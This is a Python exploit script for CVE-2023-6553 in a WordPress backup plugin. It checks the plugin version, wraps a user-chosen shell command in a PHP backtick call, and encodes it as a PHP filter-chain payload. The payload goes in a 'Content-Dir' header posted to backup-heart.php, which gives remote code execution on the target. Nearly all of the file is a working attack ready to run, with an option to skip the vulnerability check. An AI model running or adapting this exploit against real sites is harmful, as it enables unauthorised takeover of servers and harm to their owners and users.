#!/usr/bin/env python3
import requests
import argparse
import urllib3
import re
from packaging.version import Version
import php_filter_chain_generator.php_filter_chain_generator as php_fcg
import pathlib
import base64

# Disables a pyright warning, because its annoying
# pyright: reportOptionalMemberAccess=false 
# Disables the InsecureRequestWarning because we set verify to False because of proxies
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Global variable for the args
args = None

def log_success(msg: str):
    """
    Logs a success message to stdout

    Arguments:
        msg(str): The message to log
    """
    print(f"[+] {msg}")

def log_failure(msg: str):
    """
    Logs a failure message to stdout

    Arguments:
        msg(str): The message to log
    """
    print(f"[-] {msg}")

def log_info(msg: str):
    """
    Logs a info message to stdout

    Arguments:
        msg(str): The message to log
    """
    print(f"[*] {msg}")

def log_result(msg: str):
    """
    Logs a result message to stdout

    Arguments:
        msg(str): The message to log
    """
    print(f"[>] {msg}")

def parse_args() -> argparse.Namespace:
    """
    Parses the command line args
    Required arguments are marked by a star (*)

    Returns:
        argparse.Namespace: the parsed args
    """

    # Add some default checks 
    parser = argparse.ArgumentParser(description="CVE-2023-6553 exploit script by cc3305")
    parser.add_argument("URL", action="store", help="Target url")
    parser.add_argument("-f", "--force", action="store_true", help="Force the exploit (skip the check if the host is vulnerable)")
    parser.add_argument("-x", "--proxy", action="store", help="HTTP proxy in the format http://127.0.0.1:8080")
    parser.add_argument("-H", "--headers", action="append", help="Request Headers in the format `\"Header-Name: Header-Value\"`. Multiple -H flags are allowed")
    parser.add_argument("-c", "--cookie", action="append", help="Cookie data in the format `\"COOKIE1=VALUE1; COOKIE2=VALUE2\"`")

    # Add more checks according to exploit, e.g. add a "--command" for a RCE exploit
    parser.add_argument("-C", "--command", action="store", help="* Command to run on the target if exploited successfully", required=True)
    
    # Return the parsed args
    result = parser.parse_args()

    # Bring the proxy, cookies and headers into a pythonic format
    result.proxy = {"http": result.proxy, "https": result.proxy}

    headers = {}
    if(result.headers != None):
        for header in result.headers:
            try:
                header_parts = header.split("=")
                headers[header_parts[0]] = header_parts[1]
            except:
                continue
    result.headers = headers

    cookies = {}
    if(result.cookie != None):
        for cookie in result.cookie.split(";"):
            try:
                cookie_parts = cookie.split("=")
                cookies[cookie_parts[0]] = cookie_parts[1]
            except:
                continue
    result.cookie = cookies

    # The program always assumes the url is in the format http://something.com/, not in http://something.com
    if not result.URL.endswith("/"):
        result.URL = f"{result.URL}/"

    return result

def check_vulnerable() -> bool:
    """
    Check if the target is vulnerable
    If there is no way to determine if the host is vulnerable just return true

    Returns:
        bool: True if the target is vulnerable, False otherwire
    """
    # First check if the plugin is even on the server
    exists_resp = requests.get(f"{args.URL}/wp-content/plugins/backup-backup/includes/config.php", headers=args.headers, verify=False, proxies=args.proxy, cookies=args.cookie)
    if exists_resp.status_code != 200:
        log_failure(f"Plugin does not seem to be on the server")
        return False
    log_info("Plugin exists!")

    # Check the readme.txt for the version
    readme_resp = requests.get(f"{args.URL}/wp-content/plugins/backup-backup/readme.txt", headers=args.headers, verify=False, proxies=args.proxy, cookies=args.cookie)
    if readme_resp.status_code != 200:
        log_failure(f"Could not get readme.txt to read version, assuming not vulnerable")
        return False

    version_match = re.search(r"Stable tag: (.*)", readme_resp.text)
    if version_match is None:
        log_failure(f"Could not read version from readme.txt, assuming not vulnerable")
        return False
    
    version = Version(version_match.group(1))

    log_info(f"Plugin has version {version}")
    return version <= Version("1.3.7")

def generate_payload(code: str) -> str:
    """
    Generates a payload based on the code provided

    Arguments:
        code(str): The code to convert to a payload

    Returns:
        str: The generated payload
    """
    # B64 encode the code and remove the equal signs
    utf8_code = code.encode("utf-8")
    b64_code = base64.b64encode(utf8_code).decode("utf-8").replace("=", "")
    return php_fcg.generate_filter_chain(b64_code)

def run_exploit():
    """
    Where most of the magic happens
    """
    # Generate the payload from the command to execute
    code_to_inject = f"<?php `{args.command}`; ?>"
    payload_to_send = generate_payload(code_to_inject)

    # Inject the payload into the "Content-Dir" header
    additional_headers = {"Content-Dir": payload_to_send}
    headers = args.headers | additional_headers

    resp = requests.post(f"{args.URL}/wp-content/plugins/backup-backup/includes/backup-heart.php", headers=headers, verify=False, proxies=args.proxy, cookies=args.cookie)
    if resp.status_code != 200:
        if resp.status_code == 404:
            log_failure(f"Could not run exploit, the vulnerable file does not seem to be on the server (patched version?)")
            return
        log_failure(f"Could not run exploit, status code {resp.status_code}")
        return

    log_success(f"Exploit ran successfully, but this exploit has no output")

def check_phpfgc() -> bool:
    """
    Checks if phpggc is in the correct spot

    Returns: 
        bool: True if phpggc is present, false otherwise
    """
    phpfgc_filepath = pathlib.Path("./php_filter_chain_generator/php_filter_chain_generator.py")
    return phpfgc_filepath.exists()

# Entrypoint, this gets executed first
def main():
    global args
    args = parse_args()

    if not check_phpfgc():
        log_failure(f"php_filter_chain_generator not found, check the README for installation")
        exit(0)

    if not args.force:
        if not check_vulnerable():
            log_failure(f"Host seems to not be vulnerable, use --force to override")
            exit(0)

    run_exploit()

if __name__ == "__main__":
    main()

